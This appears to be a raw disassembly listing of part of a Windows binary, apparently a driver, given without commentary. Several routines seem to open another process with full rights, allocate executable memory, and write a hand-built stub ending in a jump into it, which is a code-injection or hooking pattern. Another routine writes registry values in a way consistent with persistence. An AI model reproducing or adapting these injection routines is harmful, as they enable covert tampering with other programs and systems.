   16e3a:	mov    eax,DWORD PTR [ebp+0x10]
   16e3d:	movzx  eax,BYTE PTR [eax]
   16e40:	cmp    eax,0x100
   16e45:	jge    0x16e5d
   16e47:	mov    ecx,DWORD PTR ds:0x7f864
   16e4d:	lea    eax,[ebp-0x8]
   16e50:	push   eax
   16e51:	lea    eax,[ebp+0xc]
   16e54:	push   eax
   16e55:	call   0x13c84
   16e5a:	mov    esi,DWORD PTR [ebp+0xc]
   16e5d:	mov    eax,ds:0x7f864
   16e62:	cmp    esi,DWORD PTR [eax+0x4]
   16e65:	je     0x16e6c
   16e67:	mov    esi,DWORD PTR [esi+0x14]
   16e6a:	jmp    0x16e6f
   16e6c:	mov    esi,DWORD PTR [ebp+0x8]
   16e6f:	call   0x1a218
   16e74:	push   DWORD PTR [ebp-0x8]
   16e77:	call   0x10a9a
   16e7c:	pop    ecx
   16e7d:	mov    eax,esi
   16e7f:	pop    esi
   16e80:	leave  
   16e81:	ret    0xc
   16e84:	int3   
   16e85:	int3   
   16e86:	int3   
   16e87:	int3   
   16e88:	int3   
   16e89:	int3   
   16e8a:	mov    edi,edi
   16e8c:	push   esi
   16e8d:	mov    esi,ecx
   16e8f:	mov    BYTE PTR [esi+0x8],0x0
   16e93:	call   0x14094
   16e98:	mov    eax,esi
   16e9a:	pop    esi
   16e9b:	ret    0x8
   16e9e:	int3   
   16e9f:	int3   
   16ea0:	int3   
   16ea1:	int3   
   16ea2:	int3   
   16ea3:	int3   
   16ea4:	mov    edi,edi
   16ea6:	push   ebp
   16ea7:	mov    ebp,esp
   16ea9:	sub    esp,0xb0
   16eaf:	push   esi
   16eb0:	mov    esi,ecx
   16eb2:	lea    ecx,[ebp-0x58]
   16eb5:	call   0x136d8
   16eba:	push   eax
   16ebb:	push   DWORD PTR [ebp+0x8]
   16ebe:	lea    ecx,[ebp-0xb0]
   16ec4:	call   0x138b4
   16ec9:	push   eax
   16eca:	lea    eax,[ebp-0x8]
   16ecd:	push   eax
   16ece:	mov    ecx,esi
   16ed0:	call   0x16afe
   16ed5:	mov    esi,DWORD PTR [eax]
   16ed7:	lea    ecx,[ebp-0xb0]
   16edd:	call   0x12ae0
   16ee2:	lea    ecx,[ebp-0x58]
   16ee5:	call   0x11ece
   16eea:	lea    eax,[esi+0x18]
   16eed:	pop    esi
   16eee:	leave  
   16eef:	ret    0x4
   16ef2:	int3   
   16ef3:	int3   
   16ef4:	int3   
   16ef5:	int3   
   16ef6:	int3   
   16ef7:	int3   
   16ef8:	mov    edi,edi
   16efa:	push   ebp
   16efb:	mov    ebp,esp
   16efd:	sub    esp,0x20
   16f00:	push   esi
   16f01:	push   0xffffffff
   16f03:	mov    esi,ecx
   16f05:	push   0x1df30
   16f0a:	lea    ecx,[ebp-0x8]
   16f0d:	call   0x110ae
   16f12:	lea    eax,[ebp-0x8]
   16f15:	push   eax
   16f16:	push   DWORD PTR [ebp+0x8]
   16f19:	lea    ecx,[ebp-0x20]
   16f1c:	call   0x12c3c
   16f21:	push   eax
   16f22:	lea    eax,[ebp-0x10]
   16f25:	push   eax
   16f26:	mov    ecx,esi
   16f28:	call   0x16b46
   16f2d:	mov    esi,DWORD PTR [eax]
   16f2f:	lea    ecx,[ebp-0x20]
   16f32:	call   0x12afc
   16f37:	push   DWORD PTR [ebp-0x8]
   16f3a:	call   0x10a9a
   16f3f:	pop    ecx
   16f40:	lea    eax,[esi+0x14]
   16f43:	pop    esi
   16f44:	leave  
   16f45:	ret    0x4
   16f48:	int3   
   16f49:	int3   
   16f4a:	int3   
   16f4b:	int3   
   16f4c:	int3   
   16f4d:	int3   
   16f4e:	mov    edi,edi
   16f50:	push   esi
   16f51:	mov    esi,ecx
   16f53:	mov    BYTE PTR [esi+0x8],0x0
   16f57:	call   0x141bc
   16f5c:	mov    eax,esi
   16f5e:	pop    esi
   16f5f:	ret    0x8
   16f62:	int3   
   16f63:	int3   
   16f64:	int3   
   16f65:	int3   
   16f66:	int3   
   16f67:	int3   
   16f68:	mov    edi,edi
   16f6a:	push   ebp
   16f6b:	mov    ebp,esp
   16f6d:	sub    esp,0x14
   16f70:	and    DWORD PTR [ebp-0x4],0x0
   16f74:	push   esi
   16f75:	lea    eax,[ebp-0x4]
   16f78:	push   eax
   16f79:	push   DWORD PTR [ebp+0x8]
   16f7c:	mov    esi,ecx
   16f7e:	lea    ecx,[ebp-0xc]
   16f81:	call   0x12c64
   16f86:	push   eax
   16f87:	lea    eax,[ebp-0x14]
   16f8a:	push   eax
   16f8b:	mov    ecx,esi
   16f8d:	call   0x16b70
   16f92:	mov    ecx,DWORD PTR [ebp-0x8]
   16f95:	mov    esi,DWORD PTR [eax]
   16f97:	test   ecx,ecx
   16f99:	je     0x16fa0
   16f9b:	call   0x10ab8
   16fa0:	lea    eax,[esi+0x10]
   16fa3:	pop    esi
   16fa4:	leave  
   16fa5:	ret    0x4
   16fa8:	int3   
   16fa9:	int3   
   16faa:	int3   
   16fab:	int3   
   16fac:	int3   
   16fad:	int3   
   16fae:	mov    edi,edi
   16fb0:	push   ebp
   16fb1:	mov    ebp,esp
   16fb3:	sub    esp,0x20
   16fb6:	push   esi
   16fb7:	mov    esi,ecx
   16fb9:	mov    eax,DWORD PTR [esi+0x24]
   16fbc:	mov    ecx,DWORD PTR [esi+0x28]
   16fbf:	add    ecx,eax
   16fc1:	cmp    DWORD PTR [esi+0x10],ecx
   16fc4:	jbe    0x17057
   16fca:	mov    ecx,DWORD PTR [esi+0x18]
   16fcd:	mov    ecx,DWORD PTR [ecx]
   16fcf:	push   edi
   16fd0:	mov    DWORD PTR [ebp-0x4],ecx
   16fd3:	test   eax,eax
   16fd5:	je     0x16fe4
   16fd7:	mov    edi,eax
   16fd9:	lea    ecx,[ebp-0x4]
   16fdc:	call   0x12f36
   16fe1:	dec    edi
   16fe2:	jne    0x16fd9
   16fe4:	mov    eax,DWORD PTR [ebp-0x4]
   16fe7:	mov    edi,DWORD PTR [eax+0xc]
   16fea:	lea    ecx,[ebp-0x20]
   16fed:	mov    BYTE PTR [ebp-0x18],0x0
   16ff1:	call   0x144f0
   16ff6:	mov    eax,DWORD PTR [esi+0x8]
   16ff9:	mov    ecx,DWORD PTR [eax]
   16ffb:	mov    DWORD PTR [ebp-0x4],ecx
   16ffe:	cmp    ecx,eax
   17000:	je     0x17041
   17002:	lea    edx,[ecx+0x68]
   17005:	mov    eax,DWORD PTR [edx]
   17007:	cmp    eax,edi
   17009:	jae    0x17020
   1700b:	push   ecx
   1700c:	lea    eax,[ebp-0x8]
   1700f:	push   eax
   17010:	lea    ecx,[esi+0x4]
   17013:	call   0x14f48
   17018:	mov    ecx,DWORD PTR [ebp-0x8]
   1701b:	mov    DWORD PTR [ebp-0x4],ecx
   1701e:	jmp    0x1703c
   17020:	sub    eax,edi
   17022:	mov    DWORD PTR [edx],eax
   17024:	push   edx
   17025:	lea    eax,[ebp-0x10]
   17028:	push   eax
   17029:	lea    ecx,[ebp-0x20]
   1702c:	call   0x160d4
   17031:	lea    ecx,[ebp-0x4]
   17034:	call   0x12ec0
   17039:	mov    ecx,DWORD PTR [ebp-0x4]
   1703c:	cmp    ecx,DWORD PTR [esi+0x8]
   1703f:	jne    0x17002
   17041:	lea    eax,[ebp-0x20]
   17044:	push   eax
   17045:	add    esi,0x14
   17048:	push   esi
   17049:	call   0x16674
   1704e:	lea    ecx,[ebp-0x20]
   17051:	call   0x160fe
   17056:	pop    edi
   17057:	pop    esi
   17058:	leave  
   17059:	ret    
   1705a:	int3   
   1705b:	int3   
   1705c:	int3   
   1705d:	int3   
   1705e:	int3   
   1705f:	int3   
   17060:	mov    edi,edi
   17062:	push   ebp
   17063:	mov    ebp,esp
   17065:	sub    esp,0x20
   17068:	push   esi
   17069:	push   0xffffffff
   1706b:	mov    esi,ecx
   1706d:	push   0x1de8e
   17072:	lea    ecx,[ebp-0x8]
   17075:	call   0x11152
   1707a:	lea    eax,[ebp-0x8]
   1707d:	push   eax
   1707e:	push   DWORD PTR [ebp+0x8]
   17081:	lea    ecx,[ebp-0x20]
   17084:	call   0x13608
   17089:	push   eax
   1708a:	lea    eax,[ebp-0x10]
   1708d:	push   eax
   1708e:	mov    ecx,esi
   17090:	call   0x16c02
   17095:	mov    esi,DWORD PTR [eax]
   17097:	lea    ecx,[ebp-0x20]
   1709a:	call   0x12afc
   1709f:	push   DWORD PTR [ebp-0x8]
   170a2:	call   0x10a9a
   170a7:	pop    ecx
   170a8:	lea    eax,[esi+0x14]
   170ab:	pop    esi
   170ac:	leave  
   170ad:	ret    0x4
   170b0:	int3   
   170b1:	int3   
   170b2:	int3   
   170b3:	int3   
   170b4:	int3   
   170b5:	int3   
   170b6:	mov    edi,edi
   170b8:	push   ebp
   170b9:	mov    ebp,esp
   170bb:	sub    esp,0x838
   170c1:	mov    eax,ds:0x7eb38
   170c6:	xor    eax,ebp
   170c8:	mov    DWORD PTR [ebp-0x4],eax
   170cb:	mov    eax,DWORD PTR [ebp+0x8]
   170ce:	push   ebx
   170cf:	push   esi
   170d0:	push   edi
   170d1:	mov    DWORD PTR [ebp-0x808],eax
   170d7:	xor    eax,eax
   170d9:	push   0x7fe
   170de:	mov    WORD PTR [ebp-0x804],ax
   170e5:	xor    ebx,ebx
   170e7:	lea    eax,[ebp-0x802]
   170ed:	push   ebx
   170ee:	push   eax
   170ef:	call   0x1daf6
   170f4:	mov    eax,0x7e2c8
   170f9:	add    esp,0xc
   170fc:	mov    edx,eax
   170fe:	mov    cx,WORD PTR [eax]
   17101:	inc    eax
   17102:	inc    eax
   17103:	cmp    cx,bx
   17106:	jne    0x170fe
   17108:	sub    eax,edx
   1710a:	lea    edi,[ebp-0x804]
   17110:	dec    edi
   17111:	dec    edi
   17112:	mov    cx,WORD PTR [edi+0x2]
   17116:	inc    edi
   17117:	inc    edi
   17118:	cmp    cx,bx
   1711b:	jne    0x17112
   1711d:	mov    ecx,eax
   1711f:	shr    ecx,0x2
   17122:	mov    esi,edx
   17124:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17126:	mov    ecx,eax
   17128:	mov    eax,DWORD PTR [ebp-0x808]
   1712e:	and    ecx,0x3
   17131:	add    eax,0x400
   17136:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17138:	mov    edx,eax
   1713a:	mov    cx,WORD PTR [eax]
   1713d:	inc    eax
   1713e:	inc    eax
   1713f:	cmp    cx,bx
   17142:	jne    0x1713a
   17144:	sub    eax,edx
   17146:	lea    edi,[ebp-0x804]
   1714c:	dec    edi
   1714d:	dec    edi
   1714e:	mov    cx,WORD PTR [edi+0x2]
   17152:	inc    edi
   17153:	inc    edi
   17154:	cmp    cx,bx
   17157:	jne    0x1714e
   17159:	mov    ecx,eax
   1715b:	shr    ecx,0x2
   1715e:	mov    esi,edx
   17160:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17162:	mov    ecx,eax
   17164:	and    ecx,0x3
   17167:	lea    eax,[ebp-0x804]
   1716d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1716f:	mov    DWORD PTR [ebp-0x818],eax
   17175:	lea    ecx,[eax+0x2]
   17178:	mov    dx,WORD PTR [eax]
   1717b:	inc    eax
   1717c:	inc    eax
   1717d:	cmp    dx,bx
   17180:	jne    0x17178
   17182:	sub    eax,ecx
   17184:	sar    eax,1
   17186:	add    eax,eax
   17188:	mov    WORD PTR [ebp-0x81a],ax
   1718f:	mov    WORD PTR [ebp-0x81c],ax
   17196:	lea    eax,[ebp-0x81c]
   1719c:	mov    DWORD PTR [ebp-0x82c],eax
   171a2:	lea    eax,[ebp-0x838]
   171a8:	push   eax
   171a9:	xor    edi,edi
   171ab:	inc    edi
   171ac:	push   edi
   171ad:	push   ebx
   171ae:	push   ebx
   171af:	lea    eax,[ebp-0x834]
   171b5:	push   eax
   171b6:	push   0xf003f
   171bb:	lea    eax,[ebp-0x80c]
   171c1:	push   eax
   171c2:	mov    DWORD PTR [ebp-0x834],0x18
   171cc:	mov    DWORD PTR [ebp-0x830],ebx
   171d2:	mov    DWORD PTR [ebp-0x828],0x40
   171dc:	mov    DWORD PTR [ebp-0x824],ebx
   171e2:	mov    DWORD PTR [ebp-0x820],ebx
   171e8:	call   0x119e6
   171ed:	call   eax
   171ef:	test   eax,eax
   171f1:	jl     0x17380
   171f7:	push   0x1e5a0
   171fc:	push   0x9
   171fe:	push   0x1e58c
   17203:	call   0x16c9e
   17208:	mov    DWORD PTR [ebp-0x810],eax
   1720e:	lea    edx,[eax+0x2]
   17211:	mov    cx,WORD PTR [eax]
   17214:	inc    eax
   17215:	inc    eax
   17216:	cmp    cx,bx
   17219:	jne    0x17211
   1721b:	sub    eax,edx
   1721d:	sar    eax,1
   1721f:	add    eax,eax
   17221:	mov    WORD PTR [ebp-0x812],ax
   17228:	mov    WORD PTR [ebp-0x814],ax
   1722f:	mov    eax,DWORD PTR [ebp-0x808]
   17235:	lea    ecx,[eax+0x2]
   17238:	mov    dx,WORD PTR [eax]
   1723b:	inc    eax
   1723c:	inc    eax
   1723d:	cmp    dx,bx
   17240:	jne    0x17238
   17242:	sub    eax,ecx
   17244:	sar    eax,1
   17246:	inc    eax
   17247:	movzx  eax,ax
   1724a:	add    eax,eax
   1724c:	push   eax
   1724d:	push   DWORD PTR [ebp-0x808]
   17253:	lea    eax,[ebp-0x814]
   17259:	push   edi
   1725a:	push   ebx
   1725b:	push   eax
   1725c:	push   DWORD PTR [ebp-0x80c]
   17262:	call   0x11818
   17267:	call   eax
   17269:	test   eax,eax
   1726b:	jl     0x17380
   17271:	push   0x1e554
   17276:	push   0x5
   17278:	push   0x1e548
   1727d:	mov    DWORD PTR [ebp-0x808],0x3
   17287:	call   0x16c9e
   1728c:	mov    DWORD PTR [ebp-0x810],eax
   17292:	lea    edx,[eax+0x2]
   17295:	mov    cx,WORD PTR [eax]
   17298:	inc    eax
   17299:	inc    eax
   1729a:	cmp    cx,bx
   1729d:	jne    0x17295
   1729f:	sub    eax,edx
   172a1:	push   0x4
   172a3:	sar    eax,1
   172a5:	pop    esi
   172a6:	add    eax,eax
   172a8:	push   esi
   172a9:	mov    WORD PTR [ebp-0x812],ax
   172b0:	mov    WORD PTR [ebp-0x814],ax
   172b7:	lea    eax,[ebp-0x808]
   172bd:	push   eax
   172be:	push   esi
   172bf:	push   ebx
   172c0:	lea    eax,[ebp-0x814]
   172c6:	push   eax
   172c7:	push   DWORD PTR [ebp-0x80c]
   172cd:	call   0x11818
   172d2:	call   eax
   172d4:	test   eax,eax
   172d6:	jl     0x17380
   172dc:	push   0x1e522
   172e1:	push   esi
   172e2:	push   0x1e518
   172e7:	mov    DWORD PTR [ebp-0x808],edi
   172ed:	call   0x16c9e
   172f2:	mov    DWORD PTR [ebp-0x810],eax
   172f8:	lea    ecx,[eax+0x2]
   172fb:	mov    dx,WORD PTR [eax]
   172fe:	inc    eax
   172ff:	inc    eax
   17300:	cmp    dx,bx
   17303:	jne    0x172fb
   17305:	sub    eax,ecx
   17307:	sar    eax,1
   17309:	add    eax,eax
   1730b:	push   esi
   1730c:	mov    WORD PTR [ebp-0x812],ax
   17313:	mov    WORD PTR [ebp-0x814],ax
   1731a:	lea    eax,[ebp-0x808]
   17320:	push   eax
   17321:	push   esi
   17322:	push   ebx
   17323:	lea    eax,[ebp-0x814]
   17329:	push   eax
   1732a:	push   DWORD PTR [ebp-0x80c]
   17330:	call   0x11818
   17335:	call   eax
   17337:	test   eax,eax
   17339:	jl     0x17380
   1733b:	lea    eax,[ebp-0x81c]
   17341:	push   eax
   17342:	call   0x119bc
   17347:	call   eax
   17349:	test   eax,eax
   1734b:	jl     0x17380
   1734d:	lea    eax,[ebp-0x804]
   17353:	push   eax
   17354:	push   DWORD PTR [ebp-0x80c]
   1735a:	call   0x1215e
   1735f:	test   al,al
   17361:	je     0x17374
   17363:	push   DWORD PTR [ebp-0x80c]
   17369:	call   0x117ee
   1736e:	call   eax
   17370:	test   eax,eax
   17372:	jl     0x17380
   17374:	push   DWORD PTR [ebp-0x80c]
   1737a:	call   DWORD PTR ds:0x1f060
   17380:	mov    ecx,DWORD PTR [ebp-0x4]
   17383:	pop    edi
   17384:	pop    esi
   17385:	xor    ecx,ebp
   17387:	pop    ebx
   17388:	call   0x1da79
   1738d:	leave  
   1738e:	ret    0x4
   17391:	int3   
   17392:	int3   
   17393:	int3   
   17394:	int3   
   17395:	int3   
   17396:	mov    edi,edi
   17398:	push   ebp
   17399:	mov    ebp,esp
   1739b:	sub    esp,0x44
   1739e:	mov    eax,DWORD PTR [ebp+0xc]
   173a1:	mov    eax,DWORD PTR [eax]
   173a3:	push   esi
   173a4:	mov    DWORD PTR [ebp-0x2c],eax
   173a7:	lea    eax,[ebp-0x2c]
   173aa:	push   eax
   173ab:	lea    eax,[ebp-0x44]
   173ae:	push   eax
   173af:	xor    esi,esi
   173b1:	push   0x1f0fff
   173b6:	lea    eax,[ebp-0x10]
   173b9:	push   eax
   173ba:	mov    DWORD PTR [ebp-0x44],0x18
   173c1:	mov    DWORD PTR [ebp-0x40],esi
   173c4:	mov    DWORD PTR [ebp-0x38],0x200
   173cb:	mov    DWORD PTR [ebp-0x3c],esi
   173ce:	mov    DWORD PTR [ebp-0x34],esi
   173d1:	mov    DWORD PTR [ebp-0x30],esi
   173d4:	mov    DWORD PTR [ebp-0x28],esi
   173d7:	mov    DWORD PTR [ebp-0x10],esi
   173da:	call   0x1169e
   173df:	call   eax
   173e1:	test   eax,eax
   173e3:	jl     0x17654
   173e9:	push   ebx
   173ea:	push   edi
   173eb:	push   0x40
   173ed:	mov    edi,0x1000
   173f2:	push   edi
   173f3:	lea    eax,[ebp-0x14]
   173f6:	push   eax
   173f7:	push   esi
   173f8:	lea    eax,[ebp-0x8]
   173fb:	push   eax
   173fc:	push   DWORD PTR [ebp-0x10]
   173ff:	mov    DWORD PTR [ebp-0x8],esi
   17402:	mov    esi,DWORD PTR ds:0x1f040
   17408:	mov    ebx,0x400
   1740d:	mov    DWORD PTR [ebp-0x14],ebx
   17410:	call   esi
   17412:	test   eax,eax
   17414:	jl     0x1741f
   17416:	mov    eax,DWORD PTR [ebp-0x8]
   17419:	mov    ecx,DWORD PTR [ebp+0xc]
   1741c:	mov    DWORD PTR [ecx+0x8],eax
   1741f:	and    DWORD PTR [ebp-0x18],0x0
   17423:	push   0x4
   17425:	push   edi
   17426:	lea    eax,[ebp-0x14]
   17429:	push   eax
   1742a:	push   0x0
   1742c:	lea    eax,[ebp-0x18]
   1742f:	push   eax
   17430:	push   DWORD PTR [ebp-0x10]
   17433:	mov    DWORD PTR [ebp-0x14],ebx
   17436:	call   esi
   17438:	test   eax,eax
   1743a:	jl     0x17445
   1743c:	mov    eax,DWORD PTR [ebp-0x18]
   1743f:	mov    ecx,DWORD PTR [ebp+0xc]
   17442:	mov    DWORD PTR [ecx+0xc],eax
   17445:	lea    eax,[ebp-0x1c]
   17448:	push   eax
   17449:	push   DWORD PTR [ebp-0x2c]
   1744c:	call   0x11cb0
   17451:	call   eax
   17453:	test   eax,eax
   17455:	jl     0x17652
   1745b:	push   DWORD PTR [ebp-0x1c]
   1745e:	call   0x11a64
   17463:	call   eax
   17465:	mov    ebx,DWORD PTR [ebp-0x8]
   17468:	and    DWORD PTR [ebp-0x4],0x0
   1746c:	test   ebx,ebx
   1746e:	je     0x17638
   17474:	mov    edi,DWORD PTR [ebp-0x18]
   17477:	push   0x40
   17479:	push   0x7e208
   1747e:	push   edi
   1747f:	mov    DWORD PTR [ebp-0xc],edi
   17482:	call   0x19892
   17487:	push   0x1e5d2
   1748c:	push   0x4
   1748e:	push   0x1e5c8
   17493:	call   0x16c9e
   17498:	mov    esi,eax
   1749a:	mov    cx,WORD PTR [eax]
   1749d:	inc    eax
   1749e:	inc    eax
   1749f:	test   cx,cx
   174a2:	jne    0x1749a
   174a4:	sub    eax,esi
   174a6:	dec    edi
   174a7:	dec    edi
   174a8:	mov    cx,WORD PTR [edi+0x2]
   174ac:	inc    edi
   174ad:	inc    edi
   174ae:	test   cx,cx
   174b1:	jne    0x174a8
   174b3:	mov    ecx,eax
   174b5:	shr    ecx,0x2
   174b8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   174ba:	mov    ecx,eax
   174bc:	push   0x60
   174be:	and    ecx,0x3
   174c1:	push   ebx
   174c2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   174c4:	mov    DWORD PTR [ebp-0x20],ebx
   174c7:	call   0x19844
   174cc:	push   0x68
   174ce:	push   eax
   174cf:	call   0x19844
   174d4:	push   DWORD PTR [ebp-0xc]
   174d7:	push   eax
   174d8:	call   0x1985c
   174dd:	push   0xb8
   174e2:	push   eax
   174e3:	call   0x19844
   174e8:	push   DWORD PTR ds:0x7ed80
   174ee:	push   eax
   174ef:	call   0x1985c
   174f4:	push   0xc00b
   174f9:	push   eax
   174fa:	call   0x19876
   174ff:	push   0x74
   17501:	push   eax
   17502:	call   0x19844
   17507:	push   0x2
   17509:	push   eax
   1750a:	call   0x19844
   1750f:	push   0xd0ff
   17514:	push   eax
   17515:	call   0x19876
   1751a:	push   0x61
   1751c:	push   eax
   1751d:	call   0x19844
   17522:	mov    ebx,DWORD PTR [ebp+0x8]
   17525:	mov    edi,eax
   17527:	mov    esi,ebx
   17529:	push   0x0
   1752b:	push   esi
   1752c:	push   edi
   1752d:	call   0x19ffe
   17532:	mov    ecx,eax
   17534:	sub    ecx,esi
   17536:	add    DWORD PTR [ebp-0x4],ecx
   17539:	add    edi,ecx
   1753b:	cmp    DWORD PTR [ebp-0x4],0x5
   1753f:	mov    esi,eax
   17541:	jb     0x17529
   17543:	mov    eax,DWORD PTR [ebp-0x4]
   17546:	push   edi
   17547:	add    eax,ebx
   17549:	push   eax
   1754a:	call   0x198ba
   1754f:	mov    eax,DWORD PTR [ebp-0x8]
   17552:	test   eax,eax
   17554:	je     0x17638
   1755a:	add    eax,0x400
   1755f:	lea    ecx,[eax-0x10]
   17562:	mov    DWORD PTR [ebp-0x24],ecx
   17565:	mov    ecx,DWORD PTR [ebp-0x4]
   17568:	lea    esi,[eax-0xc]
   1756b:	push   esi
   1756c:	lea    edi,[eax-0x4]
   1756f:	lea    ebx,[eax-0x8]
   17572:	shr    ecx,0x2
   17575:	lea    ecx,[ecx*4+0x14]
   1757c:	push   0x40
   1757e:	sub    eax,ecx
   17580:	push   ebx
   17581:	mov    DWORD PTR [ebp-0xc],eax
   17584:	mov    eax,DWORD PTR [ebp+0x8]
   17587:	mov    DWORD PTR [edi],eax
   17589:	push   edi
   1758a:	mov    DWORD PTR [ebx],0x5
   17590:	and    DWORD PTR [esi],0x0
   17593:	push   0xffffffff
   17595:	call   DWORD PTR ds:0x7ecfc
   1759b:	test   eax,eax
   1759d:	jl     0x17602
   1759f:	push   DWORD PTR [ebp-0x4]
   175a2:	push   0x90
   175a7:	push   DWORD PTR [ebp-0xc]
   175aa:	call   0x1daf6
   175af:	mov    eax,DWORD PTR [ebp-0x20]
   175b2:	sub    eax,DWORD PTR [ebp+0x8]
   175b5:	add    esp,0xc
   175b8:	sub    eax,0x5
   175bb:	push   eax
   175bc:	mov    eax,DWORD PTR [ebp-0xc]
   175bf:	inc    eax
   175c0:	push   eax
   175c1:	call   0x1985c
   175c6:	push   0xe9
   175cb:	push   DWORD PTR [ebp-0xc]
   175ce:	call   0x19844
   175d3:	mov    eax,DWORD PTR [ebp-0x24]
   175d6:	and    DWORD PTR [eax],0x0
   175d9:	push   eax
   175da:	push   DWORD PTR [ebp-0x4]
   175dd:	push   DWORD PTR [ebp-0xc]
   175e0:	push   DWORD PTR [ebp+0x8]
   175e3:	push   0xffffffff
   175e5:	call   DWORD PTR ds:0x7ecf0
   175eb:	mov    eax,DWORD PTR [ebp+0xc]
   175ee:	mov    BYTE PTR [eax+0x10],0x1
   175f2:	lea    eax,[ebp-0x20]
   175f5:	push   eax
   175f6:	push   DWORD PTR [esi]
   175f8:	push   ebx
   175f9:	push   edi
   175fa:	push   0xffffffff
   175fc:	call   DWORD PTR ds:0x7ecfc
   17602:	mov    esi,DWORD PTR [ebp-0x8]
   17605:	test   esi,esi
   17607:	je     0x17638
   17609:	lea    eax,[esi+0x400]
   1760f:	lea    ecx,[eax-0x4]
   17612:	lea    edx,[eax-0x8]
   17615:	add    eax,0xfffffff4
   17618:	push   eax
   17619:	push   0x20
   1761b:	push   edx
   1761c:	mov    DWORD PTR [ecx],esi
   1761e:	push   ecx
   1761f:	mov    DWORD PTR [edx],0x400
   17625:	and    DWORD PTR [eax],0x0
   17628:	push   0xffffffff
   1762a:	call   DWORD PTR ds:0x7ecfc
   17630:	test   eax,eax
   17632:	jge    0x17638
   17634:	and    DWORD PTR [ebp-0x8],0x0
   17638:	call   0x11a3a
   1763d:	call   eax
   1763f:	call   0x11c86
   17644:	mov    ecx,DWORD PTR [ebp-0x1c]
   17647:	call   eax
   17649:	push   DWORD PTR [ebp-0x10]
   1764c:	call   DWORD PTR ds:0x1f060
   17652:	pop    edi
   17653:	pop    ebx
   17654:	pop    esi
   17655:	leave  
   17656:	ret    0x8
   17659:	int3   
   1765a:	int3   
   1765b:	int3   
   1765c:	int3   
   1765d:	int3   
   1765e:	mov    edi,edi
   17660:	push   ebp
   17661:	mov    ebp,esp
   17663:	cmp    DWORD PTR ds:0x7ed80,0x0
   1766a:	push   esi
   1766b:	mov    esi,DWORD PTR [ebp+0x10]
   1766e:	jne    0x17739
   17674:	push   0x1e78a
   17679:	push   0xc
   1767b:	push   0x1e770
   17680:	call   0x16c9e
   17685:	push   eax
   17686:	push   DWORD PTR [ebp+0x8]
   17689:	call   0x10e16
   1768e:	test   al,al
   17690:	je     0x17739
   17696:	mov    eax,DWORD PTR [esi+0x4]
   17699:	push   0x1e734
   1769e:	push   0xc
   176a0:	push   0x1e726
   176a5:	mov    ds:0x7ed78,eax
   176aa:	call   0x16d94
   176af:	push   eax
   176b0:	push   DWORD PTR [esi+0x4]
   176b3:	call   0x123c2
   176b8:	push   0x1e6f8
   176bd:	push   0xc
   176bf:	push   0x1e6ea
   176c4:	mov    ds:0x7ed80,eax
   176c9:	call   0x16d94
   176ce:	push   eax
   176cf:	push   DWORD PTR [esi+0x4]
   176d2:	call   0x123c2
   176d7:	push   0x1e6c2
   176dc:	push   0xc
   176de:	push   0x1e6b4
   176e3:	mov    ds:0x7ed84,eax
   176e8:	call   0x16d94
   176ed:	push   eax
   176ee:	push   DWORD PTR [esi+0x4]
   176f1:	call   0x123c2
   176f6:	push   0x1e68a
   176fb:	push   0x5
   176fd:	push   0x1e684
   17702:	mov    ds:0x7ed88,eax
   17707:	call   0x16d94
   1770c:	push   eax
   1770d:	push   DWORD PTR [esi+0x4]
   17710:	call   0x123c2
   17715:	push   0x1e644
   1771a:	push   0x4
   1771c:	push   0x1e63e
   17721:	mov    ds:0x7ed8c,eax
   17726:	call   0x16d94
   1772b:	push   eax
   1772c:	push   DWORD PTR [esi+0x4]
   1772f:	call   0x123c2
   17734:	mov    ds:0x7ed90,eax
   17739:	cmp    DWORD PTR ds:0x7ed7c,0x0
   17740:	jne    0x17768
   17742:	push   0x1e616
   17747:	push   0x9
   17749:	push   0x1e602
   1774e:	call   0x16c9e
   17753:	push   eax
   17754:	push   DWORD PTR [ebp+0x8]
   17757:	call   0x10e16
   1775c:	test   al,al
   1775e:	je     0x17768
   17760:	mov    eax,DWORD PTR [esi+0x4]
   17763:	mov    ds:0x7ed7c,eax
   17768:	pop    esi
   17769:	pop    ebp
   1776a:	ret    0xc
   1776d:	int3   
   1776e:	int3   
   1776f:	int3   
   17770:	int3   
   17771:	int3   
   17772:	mov    edi,edi
   17774:	push   ebp
   17775:	mov    ebp,esp
   17777:	sub    esp,0x4c
   1777a:	push   ebx
   1777b:	push   esi
   1777c:	push   edi
   1777d:	push   DWORD PTR [ebp+0xc]
   17780:	push   DWORD PTR [ebp+0x8]
   17783:	call   DWORD PTR ds:0x7ed08
   17789:	mov    DWORD PTR [ebp-0x8],eax
   1778c:	xor    eax,eax
   1778e:	xor    ebx,ebx
   17790:	mov    DWORD PTR [ebp-0x30],ebx
   17793:	lea    edi,[ebp-0x2c]
   17796:	stos   DWORD PTR es:[edi],eax
   17797:	stos   DWORD PTR es:[edi],eax
   17798:	stos   DWORD PTR es:[edi],eax
   17799:	stos   DWORD PTR es:[edi],eax
   1779a:	xor    eax,eax
   1779c:	mov    DWORD PTR [ebp-0x1c],ebx
   1779f:	lea    edi,[ebp-0x18]
   177a2:	stos   DWORD PTR es:[edi],eax
   177a3:	stos   DWORD PTR es:[edi],eax
   177a4:	stos   DWORD PTR es:[edi],eax
   177a5:	stos   DWORD PTR es:[edi],eax
   177a6:	lea    eax,[ebp-0x30]
   177a9:	push   eax
   177aa:	push   ebx
   177ab:	call   0x10ea4
   177b0:	mov    BYTE PTR [ebp+0xf],al
   177b3:	lea    eax,[ebp-0x1c]
   177b6:	push   eax
   177b7:	push   0x1
   177b9:	call   0x10ea4
   177be:	mov    BYTE PTR [ebp-0x1],al
   177c1:	cmp    BYTE PTR [ebp+0xf],bl
   177c4:	je     0x17825
   177c6:	mov    esi,DWORD PTR [ebp-0x30]
   177c9:	cmp    esi,ebx
   177cb:	je     0x17825
   177cd:	push   0x6
   177cf:	pop    ecx
   177d0:	push   ebx
   177d1:	xor    eax,eax
   177d3:	mov    DWORD PTR [ebp-0x4c],ebx
   177d6:	lea    edi,[ebp-0x48]
   177d9:	push   0x1c
   177db:	rep stos DWORD PTR es:[edi],eax
   177dd:	lea    eax,[ebp-0x4c]
   177e0:	push   eax
   177e1:	push   ebx
   177e2:	push   DWORD PTR [ebp+0x8]
   177e5:	call   0x1193e
